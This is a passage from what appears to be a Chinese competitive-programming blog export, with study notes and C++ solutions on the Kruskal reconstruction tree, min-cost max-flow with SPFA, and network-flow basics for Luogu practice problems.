边的无向带权图，每个点上有权值。当你经过一个点，你能获得一定能力值，每个地方的能力值只能获得一次，只有能力值不小于边权我才能通过这条边到达另一个点。给定起点和初始能力值，问你最后最多有多少能力值。</p><p>所以，我们能不能到达另一个点取决于整条路经的最大值是否大于我的能力值，若大于则我不能通过这条路到达该点，如果该最大值最小，则以我目前能力值无法到达该点。</p><p>我们就使用 $\text{Kruskal}$ 构造树，寻找它的祖先节点，可以证明，它祖先节点一定不是叶节点，所以如果我的能力值大于该祖先节点的值，那么我可以任意访问以这个祖先节点为根节点的任意节点，能力值可以直接加上这么多，然后再去寻找祖先节点，直到连它的父亲都无法到达或者是当前节点已经是根节点了，那就结束，那么我最终获得的能力值就是当前节点为根节点的子树的所有能力值之和加上初始值。</p><p>以某某节点为根节点的子树能力值之和可以通过 dfs 在 $O(E)$ 的复杂度得出，排序+ $\text{Kruskal}$ 构造树 $O(E)+O(Elog_2E)$ 的复杂度。寻找根节点可以用预处理倍增查询的方式去得到。这样最终我们每次查询的复杂度就是 $O(log_2n)$ 的复杂度。在本题我们可以认为它都是 $n$ ，因为它们的最大值都是一样的，这样的复杂度最终能被接受。</p><p>这里给出我写的程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="comment">//int不够直接int改long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> from;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cin&gt;&gt;from&gt;&gt;to&gt;&gt;w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> eee &amp;a)&#123;<span class="comment">//重载小于号便于排序</span></span><br><span class="line">        <span class="keyword">return</span> w&lt;a.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;e[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v[maxn&lt;&lt;<span class="number">1</span>],root[maxn&lt;&lt;<span class="number">1</span>],fa[maxn&lt;&lt;<span class="number">1</span>],value[maxn&lt;&lt;<span class="number">1</span>],a[maxn&lt;&lt;<span class="number">1</span>],dep[maxn&lt;&lt;<span class="number">1</span>],n,m,q,cnt;</span><br><span class="line"><span class="keyword">int</span> lca[maxn&lt;&lt;<span class="number">1</span>][<span class="number">30</span>];<span class="comment">//这里忘开两倍内存导致2小时的TLE RE WA各种的问题。</span></span><br><span class="line"><span class="comment">//v表示节点权值，value表示子树a和，a表示该点的能量 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fa[x] == x ? x : fa[x] = <span class="built_in">find</span>(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n<span class="number">-1</span>;i++)fa[i]=i;<span class="comment">//初始化集合</span></span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> from=e[i].from,to=e[i].to;</span><br><span class="line">        from=<span class="built_in">find</span>(from),to=<span class="built_in">find</span>(to);<span class="comment">//寻找并查集</span></span><br><span class="line">        <span class="keyword">if</span>(from==to)<span class="keyword">continue</span>;</span><br><span class="line">        v[++j+n]=e[i].w;<span class="comment">//新建一个点，点权为该边边权，并连接这两个点</span></span><br><span class="line">        <span class="built_in">add</span>(from,j+n);<span class="comment">//添加两个边。</span></span><br><span class="line">        <span class="built_in">add</span>(j+n,from);</span><br><span class="line">        <span class="built_in">add</span>(to,j+n);</span><br><span class="line">        <span class="built_in">add</span>(j+n,to);</span><br><span class="line">        fa[from]=fa[j+n];<span class="comment">//让这两个点的父亲都指向这个节点，这其实相当于一个集合的合并。</span></span><br><span class="line">        fa[to]=fa[j+n];</span><br><span class="line">        <span class="keyword">if</span>(j==n<span class="number">-1</span>)<span class="keyword">break</span>;<span class="comment">//寻找到n-1条边之后则直接退出</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> father)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=a[now];</span><br><span class="line">    fa[now]=father;</span><br><span class="line">    lca[now][<span class="number">0</span>]=father;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">17</span>;i++)&#123;</span><br><span class="line">        lca[now][i]=lca[lca[now][i<span class="number">-1</span>]][i<span class="number">-1</span>]<span class="comment">//直接整，暴力出log_2(1e5)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;<span class="comment">//朴实无华的深搜</span></span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to==father)<span class="keyword">continue</span>;</span><br><span class="line">        ans+=<span class="built_in">dfs</span>(to,now);</span><br><span class="line">    &#125;</span><br><span class="line">    value[now]=ans;<span class="comment">//保存该节点为根节点时的所有子孙节点上的能力值</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        e[i].<span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//以上为输入</span></span><br><span class="line">    <span class="built_in">sort</span>(e+<span class="number">1</span>,e+<span class="number">1</span>+m);<span class="comment">//边按照权值排序</span></span><br><span class="line">    <span class="built_in">Kruskal</span>();<span class="comment">//重构树</span></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">2</span>*n<span class="number">-1</span>,<span class="number">0</span>);<span class="comment">//深搜填value，获得以每个节点为根节点能获得的能力值，顺便处理一下LCA</span></span><br><span class="line">    v[<span class="number">0</span>]=<span class="number">1e18</span>;<span class="comment">//防止到0之后无法终止递归</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,k;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;k;</span><br><span class="line">        <span class="keyword">int</span> t=x;</span><br><span class="line">        <span class="keyword">int</span> now=value[x]+k;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> las = x;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">20</span>;i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> fa = lca[x][i];</span><br><span class="line">                <span class="keyword">if</span>(now &gt;= v[fa]) x = fa;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(x == las)<span class="keyword">break</span>;</span><br><span class="line">            now = value[x] + k;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;now&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//完结撒花</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序注释提到了，咱因为数组越界查了两个小时的错误，硬生生没看到LCA没有开两倍的内存。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/5.png" alt="5"></p><p>又一图论算法收入囊中，挺开心的。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> Kruskal重构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最小费用最大流笔记</title>
      <link href="/2022/03/05/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/05/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>时隔多日，又一模板收入其中：最小费用最大流。</p><span id="more"></span><h2 id="概念引入"><a href="#概念引入" class="headerlink" title="概念引入"></a>概念引入</h2><ul><li>费用：对每条有向边新增的一个属性，费用表示每个经过这条边的一个单位流量将会添加这么多费用。</li></ul><p>将抽象的问题具象化：在一张高速网中有 $n$ 个收费站，$m$ 条单向通行的道路，每走完一条道路就会到那边的收费站收费，收费价格会根据你走的哪条路收费，而不是固定的收费点就收固定的钱，这个也很合逻辑吧。然后一条道路最多同行 $w$ 辆车，也就是说这条路一旦走过超过 $w$ 辆车那这条路将不再放行，虽然不符合我们的认知但是他就这么规定了你也没办法嘛对吧。在 $n$ 个收费站有一个源收费站一个目的收费站，问最多有多少辆车能从源收费站到目的收费站，总费用最小的通行方案是多少。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>乍一听好像没啥思路，但是从一个司机的角度去考虑，这就会变得简单了，因为对于一个司机来说，我的目标是到达目的收费站且使我花费最少。那么起点终点确定了，每条路收费确定了，收费站之间的道路也确定了，那么我以收费为边权计算我到终点的单源最短路不就可以了么，走单源最短路一定会使得我的花费最少，因为边权是费用，最短在某种意义上就是费用最少啦。</p><p> 但是我们是不可能为每一个司机考虑的，我们可以搜出一条单源最短路，那么就很容易计算这条路上的总费用和最小流量。那么这一次我就相当于通过了，<strong>最小流量</strong> 辆车，费用相当于多了 <strong>最小流量$\times$ 总费用</strong> 。这里就跟网络流有点类似了，我求单源最短路的过程也可以视为找一条增广路。在结果保存之后我们依然要添加反向边，然后对应流量减少，反向边流量增加。但是这里我们还需要注意这个反向边费用是多少呢？其实很好理解，我一辆车过去，再回来，对车来说相当于没过去，也就没有花费<del>虽然实际情况不是这样</del>，所以我们添加反向边的时候要给路径长度为负边权。这样就决定了我们只能考虑某已死算法，虽然你可以给所有边权加上一个最大值使得每个边权为正，最后跑完 $\text{dijkstra}$ 之后再每条边减去这么多。但是实际我写出来并不行，也不知道为什么，但是听说国际公约：网络流不卡 $\text{Dinic}$ 算法，费用流不卡 $\text{spfa}$ 算法。</p><p>最后一点需要注意：一条边流量为 $0$ 之后，它应被视为断开。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><p>模板题：<a href="https://www.luogu.com.cn/problem/P3381">P3381</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ppp</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> edge;</span><br><span class="line">&#125;pre[maxn];</span><br><span class="line"><span class="keyword">int</span> s,t,ans,n,m,cnt;</span><br><span class="line"><span class="keyword">int</span> root[maxn],dis[maxn],inque[maxn],vis[maxn];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,d,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));<span class="comment">//最大初始化</span></span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);<span class="comment">//源点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        inque[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;u&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!edge[i].w)<span class="keyword">continue</span>;<span class="comment">//如果这条边没有流量则跳过</span></span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+edge[i].d)&#123;<span class="comment">//三角形不等式判定</span></span><br><span class="line">                dis[v]=dis[u]+edge[i].d;</span><br><span class="line">                pre[v].v=u;<span class="comment">//记录路径</span></span><br><span class="line">                pre[v].edge=i;</span><br><span class="line">                <span class="keyword">if</span>(!inque[v])&#123;<span class="comment">//经典spfa</span></span><br><span class="line">                    inque[v]=<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[t]!=inf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EK</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>,w=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">spfa</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> k=inf;</span><br><span class="line">        <span class="keyword">int</span> f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            k=<span class="built_in">min</span>(edge[pre[i].edge].w,k);<span class="comment">//计算最小流量</span></span><br><span class="line">            f+=edge[pre[i].edge].d; <span class="comment">//统计总费用</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            edge[pre[i].edge].w-=k;<span class="comment">//正向边流量-</span></span><br><span class="line">            edge[pre[i].edge^<span class="number">1</span>].w+=k;<span class="comment">//反向边流量+</span></span><br><span class="line">        &#125;</span><br><span class="line">        ans+=k;<span class="comment">//计算流量</span></span><br><span class="line">        w+=k*f;<span class="comment">//计算费用</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;w&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3381_8.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cnt=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> u,v,w,c;</span><br><span class="line">        cin&gt;&gt;u&gt;&gt;v&gt;&gt;w&gt;&gt;c;</span><br><span class="line">        <span class="built_in">add</span>(u,v,w,c);</span><br><span class="line">        <span class="built_in">add</span>(v,u,<span class="number">0</span>,-c);<span class="comment">//添加负费用的反向边</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">EK</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 网络流 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络流学习笔记</title>
      <link href="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近花点时间看了看网络流，也深度地学习了一下网络流的各个算法，虽然还有一个没学，但是不影响。</p><span id="more"></span><h2 id="概念引入"><a href="#概念引入" class="headerlink" title="概念引入"></a>概念引入</h2><p>首先我们要先理解一下什么是网络，网络与有向图虽然长得一模一样，但是概念略微不一样，首先网络的边权不代表路径长度，代表流量或者花费。</p><ol><li>源点：入读为0的点，只出不进</li><li>汇点：出度为0的点，只进不出</li></ol><p>在网络中，对于非源点和汇点的所有点，需要满足流入流量之和等于流出流量之和，中间节点不存储任何流量，任何一条边的流量受限于自己的容量限制。</p><p>于是有的人就想要求出：这张网络运作起来的时候，总流量最大能有多少。由于容量限制比较复杂，似乎不容易规划一个最佳方案。</p><p>such as:</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><p>在这里，很容易得出 $s\to t$ 的最大流量就是2，上面一条路，下面一条路，边上的限制都是1，因此总流量为2。这里我们再给出两个概念：</p><ol><li>增广 :在现有流量基础上发现新的路径,扩大发现的最大流量(<strong>注意</strong>:增加量不一定是这条路径的流量,而是新的流量与上次流量之差)</li><li>增广路:在现有流量基础上发现的新路径.(快来找茬,和上一条有何不同?)</li></ol><p>因此我们有了第一个算法：FF。</p><p>虽然一般来说基本通不过测试点，但是还是有必要学的。</p><h2 id="FF算法"><a href="#FF算法" class="headerlink" title="FF算法"></a>FF算法</h2><p>从源点开始寻找增广路，如过找到那么整条路径的流量减去整个路径上的最小流量，然后重复寻找增广路，直到找不到增广路为止，最大流即是每次增广路减少的流量的和，这个结论是很容易证明的，所以咱就不证了。</p><p>很有幸，咱还是写过了这个算法，每次 $\text{dfs}$ 得到一个增广路，这个算法过得了图为树时候的最大流，但是过不去标板，标板的数据量才200个点，还能 TLE 很多点。</p><p>但是有一个问题，如果我一开始走了错误的路线，比如上面的图中，假如我走了中间那条路，那么就会导致接下来找不到增广路了，所以我们在走的时候会增加反悔功能，这条反向边就是防止走了错误路线给你反悔用的，假设你走了 $s\to a \to b\to t$ ，那么此时图变成这样：</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><p>那么在往下走的过程中我就能经过 $s \to b\to a\to t$，然后到达汇点。中间这条边经过两次，变回一开始的样子，相当于就是没走，这个反向边添加在所有的网络流算法都会用到，因此一定要理解。</p><p>这里给出练习这个算法的板子吧——<a href="https://www.luogu.com.cn/problem/P3931">P3931</a></p><p>我写的程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> r,n,cnt=<span class="number">1</span>,root[maxn],fa[maxn],dest[maxn];</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;path;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span 